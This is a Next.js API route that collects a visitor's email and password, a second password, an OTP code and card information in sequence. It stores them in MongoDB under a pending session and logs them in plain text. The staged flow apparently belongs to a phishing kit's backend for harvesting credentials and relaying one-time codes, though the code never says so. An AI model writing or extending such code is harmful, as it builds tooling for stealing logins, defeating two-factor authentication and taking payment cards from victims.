import { NextRequest, NextResponse } from "next/server";
import {
  createUserSession,
  updateUserSessionPassword,
  updateUserSessionOtp,
  updateUserSessionPayment,
  getUserSession,
  updateUserSessionStatus,
} from "@/lib/mongodb";

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { action, sessionId, ...data } = body;

    console.log("API called with action:", action, "data:", data);

    // CREATE USER SESSION (Home page - email/password)
    if (action === "create") {
      const { email, password } = data;
      console.log("Creating user session for:", email);
      const sessionId = await createUserSession(email, password);
      console.log("User session created with ID:", sessionId);
      return NextResponse.json({
        sessionId,
        status: "pending",
      });
    }

    // UPDATE SESSION - PASSWORD STEP
    if (action === "update_password") {
      const { newPassword } = data;
      console.log("Adding password to session:", sessionId);
      const session = await updateUserSessionPassword(sessionId, newPassword);
      if (!session) {
        return NextResponse.json(
          { error: "Session not found" },
          { status: 404 }
        );
      }
      return NextResponse.json(session);
    }

    // UPDATE SESSION - OTP STEP
    if (action === "update_otp") {
      const { otpCode } = data;
      console.log("Adding OTP to session:", sessionId);
      const session = await updateUserSessionOtp(sessionId, otpCode);
      if (!session) {
        return NextResponse.json(
          { error: "Session not found" },
          { status: 404 }
        );
      }
      return NextResponse.json(session);
    }

    // UPDATE SESSION - PAYMENT STEP
    if (action === "update_payment") {
      const { cardInfo } = data;
      console.log("Adding payment info to session:", sessionId);
      const session = await updateUserSessionPayment(sessionId, cardInfo);
      if (!session) {
        return NextResponse.json(
          { error: "Session not found" },
          { status: 404 }
        );
      }
      return NextResponse.json(session);
    }

    // GET SESSION STATUS
    if (action === "get" && sessionId) {
      const session = await getUserSession(sessionId);
      if (!session) {
        return NextResponse.json(
          { error: "Session not found" },
          { status: 404 }
        );
      }
      return NextResponse.json(session);
    }

    return NextResponse.json({ error: "Invalid action" }, { status: 400 });
  } catch (error) {
    console.error("API Error:", error);
    return NextResponse.json({ error: "Server error" }, { status: 500 });
  }
}
